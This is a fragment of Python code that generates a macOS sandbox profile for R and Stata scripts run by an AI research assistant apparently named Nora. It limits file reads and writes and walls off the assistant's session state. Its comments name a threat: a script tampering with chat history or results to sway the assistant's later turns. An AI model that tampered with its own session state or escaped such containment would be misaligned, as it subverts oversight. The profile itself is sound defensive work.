        "    (global-name \"com.apple.nehelper\")\n"
        "    (global-name \"com.apple.nesessionmanager\")\n"
        "    (global-name \"com.apple.network.statistics\")\n"
        "    (global-name \"com.apple.SystemConfiguration.PPPController\")\n"
        "    (global-name \"com.apple.SystemConfiguration.SCNetworkReachability\"))\n"
        "\n"
        "; stat() is allowed anywhere — only reading file *contents* is\n"
        "; restricted below. R/Stata probe many paths during startup.\n"
        "(allow file-read-metadata)\n"
        "\n"
        "; File-content reads: system trees, user R/Stata config, and\n"
        "; the researcher's cwd. Everything else (including the rest\n"
        "; of the home dir) is implicitly denied.\n"
        "(allow file-read*\n"
        "    (literal \"/\")\n"
        + "".join(f"    (literal {p})\n" for p in read_literals)
        + "".join(f"    (subpath {p})\n" for p in read_subpaths)
        + ")\n"
        "\n"
        "; Carve ``.nora`` out of the cwd read allow — Nora's session\n"
        "; state (chat_history.jsonl, results.db, prior run logs) must\n"
        "; never be readable by a script. Re-allow only the current\n"
        "; run_dir below so the runtime library + result.json still\n"
        "; resolve.\n"
        f"(deny file-read* (subpath {_quote(nora_dir)}))\n"
        f"(allow file-read* (subpath {_quote(run_dir)}))\n"
        "\n"
        "; File writes restricted to the run's scratch dir and temp\n"
        "; paths used by R/Stata for internal staging.\n"
        "(allow file-write*\n"
        + "".join(f"    (subpath {p})\n" for p in write_subpaths)
        + "".join(f"    (literal {p})\n" for p in write_literals)
        + "    (regex #\"^/dev/ttys[0-9]+$\"))\n"
        "\n"
        "; Same carve-out on writes: a script must not modify Nora's\n"
        "; session state (which would let it influence future turns by\n"
        "; tampering with results.db / chat_history.jsonl). Re-allow\n"
        "; only the current run_dir so result.json + stdout/stderr\n"
        "; logs land where the executor reads them.\n"
        f"(deny file-write* (subpath {_quote(nora_dir)}))\n"
        f"(allow file-write* (subpath {_quote(run_dir)}))\n"
    )
